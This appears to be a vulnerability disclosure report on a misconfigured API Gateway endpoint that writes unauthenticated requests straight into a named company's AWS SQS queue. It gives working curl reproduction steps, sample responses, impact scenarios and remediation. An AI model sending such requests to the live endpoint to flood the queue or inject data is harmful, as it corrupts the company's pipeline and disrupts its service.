# Unauthenticated Direct Access to AWS SQS Queue via API Gateway Misconfiguration

## Summary

The analytics ingestion endpoint at `ingress.linktr.ee` routes POST requests directly to an AWS SQS queue without any application-level validation, authentication, or rate limiting. The raw AWS SQS `SendMessageResponse` XML is returned to the caller, confirming unauthenticated write access to Linktree's internal message processing pipeline.

## Severity

**High**

## Affected Endpoints

- `POST https://ingress.linktr.ee/uLZfGRmpj7` (write-key based queue)
- `POST https://ingress.linktr.ee/events` (events queue)

## Reproduction Steps

### Step 1: Send a POST request to the ingress endpoint

```bash
curl -s https://ingress.linktr.ee/uLZfGRmpj7 \
  -X POST -H "Content-Type: application/json" \
  -d '{"event":"page_view","url":"https://linktr.ee/test"}'
```

### Step 2: Observe raw AWS SQS XML response

```xml
<?xml version="1.0"?>
<SendMessageResponse xmlns="http://queue.amazonaws.com/doc/2012-11-05/">
  <SendMessageResult>
    <MessageId>d3aabc7d-b79d-44cb-8eea-841b19cd6035</MessageId>
    <MD5OfMessageBody>7f84cf2fd56453c380f0a6889044668b</MD5OfMessageBody>
    <MD5OfMessageAttributes>27c784984c45b378b941e9a21394395a</MD5OfMessageAttributes>
  </SendMessageResult>
  <ResponseMetadata>
    <RequestId>f119e2dc-6c6d-5e66-9868-80ffaa7b91ee</RequestId>
  </ResponseMetadata>
</SendMessageResponse>
```

This is the raw AWS SQS API response. A properly configured endpoint would never expose this.

### Step 3: Confirm arbitrary content is queued (MD5 changes with payload)

```bash
# Payload A
curl -s https://ingress.linktr.ee/uLZfGRmpj7 -X POST \
  -H "Content-Type: application/json" -d '{"a":"1"}'
# → MD5OfMessageBody: 7d514306db07172947190860214256e3

# Payload B
curl -s https://ingress.linktr.ee/uLZfGRmpj7 -X POST \
  -H "Content-Type: application/json" -d '{"a":"2"}'
# → MD5OfMessageBody: 4c4de1409294f3736c68d84e91377fee

# Payload A again (same MD5 = deterministic)
curl -s https://ingress.linktr.ee/uLZfGRmpj7 -X POST \
  -H "Content-Type: application/json" -d '{"a":"1"}'
# → MD5OfMessageBody: 7d514306db07172947190860214256e3
```

### Step 4: Confirm each call creates a unique message

```
Call 1: MessageId=b2a81411-d017-40b4-aeac-b5444f6493fb
Call 2: MessageId=b3954d78-d614-4f69-9e96-299f49d9e67c
Call 3: MessageId=1cd0fee9-1528-4940-b4e5-7a33261d851a
Call 4: MessageId=71d2c4b5-d19f-41a4-8508-b2d744684a7e
Call 5: MessageId=8914c7ff-23ca-45f5-84ac-23f211d5f004
```

### Step 5: Confirm request headers are forwarded as SQS MessageAttributes

Adding any custom header changes the `MD5OfMessageAttributes` hash, proving all request headers are stored as message metadata:

```bash
# Without custom header → MD5: 27c784984c45b378b941e9a21394395a
# With X-Forwarded-For  → MD5: a17dc10136e417cfede91004f30e161d
# With Authorization    → MD5: a17dc10136e417cfede91004f30e161d
# With Cookie           → MD5: a17dc10136e417cfede91004f30e161d
```

### Step 6: Confirm SQS error messages are returned directly

```bash
# Empty body triggers SQS MissingParameter error:
curl -s https://ingress.linktr.ee/uLZfGRmpj7 -X POST \
  -H "Content-Type: application/json" -d ''
```

Response:
```xml
<ErrorResponse xmlns="http://queue.amazonaws.com/doc/2012-11-05/">
  <Error>
    <Type>Sender</Type>
    <Code>MissingParameter</Code>
    <Message>The request must contain the parameter MessageBody.</Message>
  </Error>
  <RequestId>c3af56df-888c-598d-964a-34fc4e418545</RequestId>
</ErrorResponse>
```

### Step 7: Non-existent paths return 404 (proves routing is path-specific)

```bash
curl -s https://ingress.linktr.ee/DOES_NOT_EXIST -X POST \
  -H "Content-Type: application/json" -d '{"t":1}'
# → {"message":"Not Found"}
```

## Impact

### 1. Arbitrary Message Injection into Internal Pipeline

Any unauthenticated attacker can inject arbitrary JSON payloads into Linktree's SQS processing pipeline. The downstream consumer will process these messages. If the consumer performs any operations based on message content (database writes, API calls, email triggers), the injected data will be processed as trusted input.

### 2. Analytics Data Poisoning

An attacker can inject millions of fake analytics events (page views, link clicks, user signups), corrupting Linktree's business metrics and analytics data that may drive product decisions.

### 3. Queue Flooding / Denial of Service

There is no authentication or rate limiting. An attacker can flood the queue at high volume, potentially:
- Delaying processing of legitimate events
- Causing AWS SQS billing spikes
- Overwhelming downstream consumer workers

### 4. Header/Metadata Injection

All HTTP request headers are forwarded as SQS MessageAttributes. An attacker can spoof:
- `X-Forwarded-For` — fake origin IP for any downstream IP-based logic
- `Authorization` — inject fake auth context
- `Cookie` — inject fake session data
- `User-Agent`, `Referer`, `Origin` — corrupt tracking metadata

### 5. AWS Infrastructure Information Disclosure

The raw SQS XML response leaks:
- AWS SQS API namespace and version (`2012-11-05`)
- Internal AWS RequestIds
- Confirmation of API Gateway → SQS direct integration (no Lambda)
- Message attribute configuration details

## Root Cause

The API Gateway integration is configured to route POST requests directly to the SQS `SendMessage` API action without an intermediary Lambda function or application layer. The response mapping returns the raw SQS XML instead of a sanitized application response.

## Remediation

1. Add a Lambda function or application layer between API Gateway and SQS to validate input
2. Do not return raw SQS responses to clients — return a sanitized `202 Accepted`
3. Add authentication (API key, JWT) to the ingestion endpoint
4. Implement rate limiting at the API Gateway level
5. Restrict which headers are forwarded as SQS MessageAttributes
